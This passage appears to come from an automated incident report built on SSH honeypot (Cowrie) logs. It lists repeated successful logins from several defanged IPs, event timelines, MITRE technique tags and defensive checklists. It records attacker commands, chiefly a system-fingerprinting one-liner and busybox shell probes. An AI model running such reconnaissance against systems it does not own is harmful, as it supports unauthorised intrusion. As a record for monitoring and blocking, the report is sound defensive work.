| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 11:24:39` | `cowrie.session.connect` |
| `2026-07-05 11:24:40` | `cowrie.client.version` |
| `2026-07-05 11:24:40` | `cowrie.client.kex` |
| `2026-07-05 11:24:42` | `cowrie.login.success` |
| `2026-07-05 11:24:45` | `cowrie.session.params` |
| `2026-07-05 11:24:45` | `cowrie.command.input` |
| `2026-07-05 11:24:45` | `cowrie.command.input` |
| `2026-07-05 11:24:45` | `cowrie.command.input` |
| `2026-07-05 11:24:45` | `cowrie.command.input` |
| `2026-07-05 11:24:45` | `cowrie.command.input` |
| `2026-07-05 11:24:45` | `cowrie.command.success` |
| `2026-07-05 11:24:45` | `cowrie.command.input` |
| `2026-07-05 11:24:45` | `cowrie.command.input` |
| `2026-07-05 11:24:45` | `cowrie.command.input` |
| `2026-07-05 11:24:45` | `cowrie.command.input` |
| `2026-07-05 11:24:45` | `cowrie.log.closed` |
| `2026-07-05 11:24:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4d413a1aa65a

| Field | Detail |
|---|---|
| **Source IP** | `140.245.50[.]204` |
| **First Seen** | 2026-07-05 11:25 |
| **Last Seen** | 2026-07-05 11:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 11:25:23` | `cowrie.session.connect` |
| `2026-07-05 11:25:23` | `cowrie.client.version` |
| `2026-07-05 11:25:24` | `cowrie.client.kex` |
| `2026-07-05 11:25:24` | `cowrie.login.success` |
| `2026-07-05 11:25:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `140.245.50[.]204` to AbuseIPDB if not already reported
- [ ] Block `140.245.50[.]204` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2106c7c3fea6

| Field | Detail |
|---|---|
| **Source IP** | `140.245.50[.]204` |
| **First Seen** | 2026-07-05 11:25 |
| **Last Seen** | 2026-07-05 11:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 11:25:24` | `cowrie.session.connect` |
| `2026-07-05 11:25:24` | `cowrie.client.version` |
| `2026-07-05 11:25:24` | `cowrie.client.kex` |
| `2026-07-05 11:25:25` | `cowrie.login.success` |
| `2026-07-05 11:25:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `140.245.50[.]204` to AbuseIPDB if not already reported
- [ ] Block `140.245.50[.]204` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8b36a454ae4e

| Field | Detail |
|---|---|
| **Source IP** | `140.245.50[.]204` |
| **First Seen** | 2026-07-05 11:25 |
| **Last Seen** | 2026-07-05 11:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 11:25:28` | `cowrie.session.connect` |
| `2026-07-05 11:25:28` | `cowrie.client.version` |
| `2026-07-05 11:25:29` | `cowrie.client.kex` |
| `2026-07-05 11:25:30` | `cowrie.login.success` |
| `2026-07-05 11:25:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `140.245.50[.]204` to AbuseIPDB if not already reported
- [ ] Block `140.245.50[.]204` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-419ab38a5ba9

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-05 11:25 |
| **Last Seen** | 2026-07-05 11:26 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 11:25:53` | `cowrie.session.connect` |
| `2026-07-05 11:25:55` | `cowrie.client.version` |
| `2026-07-05 11:25:55` | `cowrie.client.kex` |
| `2026-07-05 11:26:00` | `cowrie.login.success` |
| `2026-07-05 11:26:04` | `cowrie.session.params` |
| `2026-07-05 11:26:04` | `cowrie.command.input` |
| `2026-07-05 11:26:06` | `cowrie.log.closed` |
| `2026-07-05 11:26:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fd5ecd6971d4

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-05 11:26 |
| **Last Seen** | 2026-07-05 11:26 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 11:26:14` | `cowrie.session.connect` |
| `2026-07-05 11:26:14` | `cowrie.client.version` |
| `2026-07-05 11:26:14` | `cowrie.client.kex` |
| `2026-07-05 11:26:17` | `cowrie.login.success` |
| `2026-07-05 11:26:19` | `cowrie.session.params` |
| `2026-07-05 11:26:19` | `cowrie.command.input` |
| `2026-07-05 11:26:19` | `cowrie.command.input` |
| `2026-07-05 11:26:19` | `cowrie.command.input` |
| `2026-07-05 11:26:19` | `cowrie.command.input` |
| `2026-07-05 11:26:19` | `cowrie.command.input` |
| `2026-07-05 11:26:19` | `cowrie.command.success` |
| `2026-07-05 11:26:19` | `cowrie.command.input` |
| `2026-07-05 11:26:19` | `cowrie.command.input` |
| `2026-07-05 11:26:19` | `cowrie.command.input` |
| `2026-07-05 11:26:19` | `cowrie.command.input` |
| `2026-07-05 11:26:19` | `cowrie.log.closed` |
| `2026-07-05 11:26:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-53e194109329

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-05 11:27 |
| **Last Seen** | 2026-07-05 11:27 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 11:27:48` | `cowrie.session.connect` |
| `2026-07-05 11:27:48` | `cowrie.client.version` |
| `2026-07-05 11:27:48` | `cowrie.client.kex` |
| `2026-07-05 11:27:51` | `cowrie.login.success` |
| `2026-07-05 11:27:52` | `cowrie.session.params` |
| `2026-07-05 11:27:52` | `cowrie.command.input` |
| `2026-07-05 11:27:52` | `cowrie.command.input` |
| `2026-07-05 11:27:52` | `cowrie.command.input` |
| `2026-07-05 11:27:52` | `cowrie.command.input` |
| `2026-07-05 11:27:52` | `cowrie.command.input` |
| `2026-07-05 11:27:52` | `cowrie.command.success` |
| `2026-07-05 11:27:52` | `cowrie.command.input` |
| `2026-07-05 11:27:52` | `cowrie.command.input` |
| `2026-07-05 11:27:52` | `cowrie.command.input` |
| `2026-07-05 11:27:52` | `cowrie.command.input` |
| `2026-07-05 11:27:53` | `cowrie.log.closed` |
| `2026-07-05 11:27:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-61f7411b6e14

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-05 11:29 |
| **Last Seen** | 2026-07-05 11:29 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 11:29:17` | `cowrie.session.connect` |
| `2026-07-05 11:29:17` | `cowrie.client.version` |
| `2026-07-05 11:29:17` | `cowrie.client.kex` |
| `2026-07-05 11:29:20` | `cowrie.login.success` |
| `2026-07-05 11:29:21` | `cowrie.session.params` |
| `2026-07-05 11:29:21` | `cowrie.command.input` |
| `2026-07-05 11:29:21` | `cowrie.command.input` |
| `2026-07-05 11:29:21` | `cowrie.command.input` |
| `2026-07-05 11:29:21` | `cowrie.command.input` |
| `2026-07-05 11:29:21` | `cowrie.command.input` |
| `2026-07-05 11:29:21` | `cowrie.command.success` |
| `2026-07-05 11:29:21` | `cowrie.command.input` |
| `2026-07-05 11:29:21` | `cowrie.command.input` |
| `2026-07-05 11:29:21` | `cowrie.command.input` |
| `2026-07-05 11:29:21` | `cowrie.command.input` |
| `2026-07-05 11:29:22` | `cowrie.log.closed` |
| `2026-07-05 11:29:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6faaa9070e02

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-05 11:30 |
| **Last Seen** | 2026-07-05 11:30 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 11:30:46` | `cowrie.session.connect` |
| `2026-07-05 11:30:47` | `cowrie.client.version` |
| `2026-07-05 11:30:47` | `cowrie.client.kex` |
| `2026-07-05 11:30:49` | `cowrie.login.success` |
| `2026-07-05 11:30:51` | `cowrie.session.params` |
| `2026-07-05 11:30:51` | `cowrie.command.input` |
| `2026-07-05 11:30:51` | `cowrie.command.input` |
| `2026-07-05 11:30:51` | `cowrie.command.input` |
| `2026-07-05 11:30:51` | `cowrie.command.input` |
| `2026-07-05 11:30:51` | `cowrie.command.input` |
| `2026-07-05 11:30:51` | `cowrie.command.success` |
| `2026-07-05 11:30:51` | `cowrie.command.input` |
| `2026-07-05 11:30:51` | `cowrie.command.input` |
| `2026-07-05 11:30:51` | `cowrie.command.input` |
| `2026-07-05 11:30:51` | `cowrie.command.input` |
| `2026-07-05 11:30:52` | `cowrie.log.closed` |
| `2026-07-05 11:30:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4d53c25531a3

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-05 11:32 |
| **Last Seen** | 2026-07-05 11:32 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 11:32:11` | `cowrie.session.connect` |
| `2026-07-05 11:32:11` | `cowrie.client.version` |
| `2026-07-05 11:32:12` | `cowrie.client.kex` |
| `2026-07-05 11:32:14` | `cowrie.login.success` |
| `2026-07-05 11:32:16` | `cowrie.session.params` |
| `2026-07-05 11:32:16` | `cowrie.command.input` |
| `2026-07-05 11:32:16` | `cowrie.command.input` |
| `2026-07-05 11:32:16` | `cowrie.command.input` |
| `2026-07-05 11:32:16` | `cowrie.command.input` |
| `2026-07-05 11:32:16` | `cowrie.command.input` |
| `2026-07-05 11:32:16` | `cowrie.command.success` |
| `2026-07-05 11:32:16` | `cowrie.command.input` |
| `2026-07-05 11:32:16` | `cowrie.command.input` |
| `2026-07-05 11:32:16` | `cowrie.command.input` |
| `2026-07-05 11:32:16` | `cowrie.command.input` |
| `2026-07-05 11:32:17` | `cowrie.log.closed` |
| `2026-07-05 11:32:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-81e1cf28a4bd

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-05 11:33 |
| **Last Seen** | 2026-07-05 11:33 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 11:33:41` | `cowrie.session.connect` |
| `2026-07-05 11:33:41` | `cowrie.client.version` |
| `2026-07-05 11:33:41` | `cowrie.client.kex` |
| `2026-07-05 11:33:44` | `cowrie.login.success` |
| `2026-07-05 11:33:46` | `cowrie.session.params` |
| `2026-07-05 11:33:46` | `cowrie.command.input` |
| `2026-07-05 11:33:46` | `cowrie.command.input` |
| `2026-07-05 11:33:46` | `cowrie.command.input` |
| `2026-07-05 11:33:46` | `cowrie.command.input` |
| `2026-07-05 11:33:46` | `cowrie.command.input` |
| `2026-07-05 11:33:46` | `cowrie.command.success` |
| `2026-07-05 11:33:46` | `cowrie.command.input` |
| `2026-07-05 11:33:46` | `cowrie.command.input` |
| `2026-07-05 11:33:46` | `cowrie.command.input` |
| `2026-07-05 11:33:46` | `cowrie.command.input` |
| `2026-07-05 11:33:47` | `cowrie.log.closed` |
| `2026-07-05 11:33:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b4c5e1917c3b

| Field | Detail |
|---|---|
| **Source IP** | `141.11.88[.]137` |
| **First Seen** | 2026-07-05 11:34 |
| **Last Seen** | 2026-07-05 11:34 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST, /bin/busybox TEST, cat /proc, ./` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 11:34:42` | `cowrie.session.connect` |
| `2026-07-05 11:34:42` | `cowrie.login.success` |
| `2026-07-05 11:34:43` | `cowrie.session.params` |
| `2026-07-05 11:34:43` | `cowrie.command.input` |
| `2026-07-05 11:34:44` | `cowrie.command.input` |
| `2026-07-05 11:34:44` | `cowrie.command.input` |
| `2026-07-05 11:34:45` | `cowrie.command.input` |
| `2026-07-05 11:34:45` | `cowrie.command.failed` |
| `2026-07-05 11:34:46` | `cowrie.log.closed` |
| `2026-07-05 11:34:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `141.11.88[.]137` to AbuseIPDB if not already reported
- [ ] Block `141.11.88[.]137` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4f9c096a7899

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-05 11:35 |
| **Last Seen** | 2026-07-05 11:35 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 11:35:09` | `cowrie.session.connect` |
| `2026-07-05 11:35:10` | `cowrie.client.version` |
| `2026-07-05 11:35:10` | `cowrie.client.kex` |
| `2026-07-05 11:35:13` | `cowrie.login.success` |
| `2026-07-05 11:35:15` | `cowrie.session.params` |
| `2026-07-05 11:35:15` | `cowrie.command.input` |
| `2026-07-05 11:35:15` | `cowrie.command.input` |
| `2026-07-05 11:35:15` | `cowrie.command.input` |
| `2026-07-05 11:35:15` | `cowrie.command.input` |
| `2026-07-05 11:35:15` | `cowrie.command.input` |
| `2026-07-05 11:35:15` | `cowrie.command.success` |
| `2026-07-05 11:35:15` | `cowrie.command.input` |
| `2026-07-05 11:35:15` | `cowrie.command.input` |
| `2026-07-05 11:35:15` | `cowrie.command.input` |
| `2026-07-05 11:35:15` | `cowrie.command.input` |
| `2026-07-05 11:35:15` | `cowrie.log.closed` |
| `2026-07-05 11:35:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3b9ab535260a

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-05 11:36 |
| **Last Seen** | 2026-07-05 11:36 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 11:36:38` | `cowrie.session.connect` |
| `2026-07-05 11:36:39` | `cowrie.client.version` |
| `2026-07-05 11:36:39` | `cowrie.client.kex` |
| `2026-07-05 11:36:41` | `cowrie.login.success` |
| `2026-07-05 11:36:43` | `cowrie.session.params` |
| `2026-07-05 11:36:43` | `cowrie.command.input` |
| `2026-07-05 11:36:43` | `cowrie.command.input` |
| `2026-07-05 11:36:43` | `cowrie.command.input` |
| `2026-07-05 11:36:43` | `cowrie.command.input` |
| `2026-07-05 11:36:43` | `cowrie.command.input` |
| `2026-07-05 11:36:43` | `cowrie.command.success` |
| `2026-07-05 11:36:43` | `cowrie.command.input` |
| `2026-07-05 11:36:43` | `cowrie.command.input` |
| `2026-07-05 11:36:43` | `cowrie.command.input` |
| `2026-07-05 11:36:43` | `cowrie.command.input` |
| `2026-07-05 11:36:44` | `cowrie.log.closed` |
| `2026-07-05 11:36:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-83928d260c03

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-05 11:37 |
| **Last Seen** | 2026-07-05 11:37 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 11:37:18` | `cowrie.session.connect` |
| `2026-07-05 11:37:19` | `cowrie.client.version` |
| `2026-07-05 11:37:19` | `cowrie.client.kex` |
| `2026-07-05 11:37:25` | `cowrie.login.success` |
| `2026-07-05 11:37:29` | `cowrie.session.params` |
| `2026-07-05 11:37:29` | `cowrie.command.input` |
| `2026-07-05 11:37:31` | `cowrie.log.closed` |
| `2026-07-05 11:37:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7401e036dd7f

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-05 11:38 |
| **Last Seen** | 2026-07-05 11:38 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 11:38:05` | `cowrie.session.connect` |
| `2026-07-05 11:38:05` | `cowrie.client.version` |
| `2026-07-05 11:38:05` | `cowrie.client.kex` |
| `2026-07-05 11:38:07` | `cowrie.login.success` |
| `2026-07-05 11:38:08` | `cowrie.session.params` |
| `2026-07-05 11:38:08` | `cowrie.command.input` |
| `2026-07-05 11:38:08` | `cowrie.command.input` |
| `2026-07-05 11:38:08` | `cowrie.command.input` |
| `2026-07-05 11:38:08` | `cowrie.command.input` |
| `2026-07-05 11:38:08` | `cowrie.command.input` |
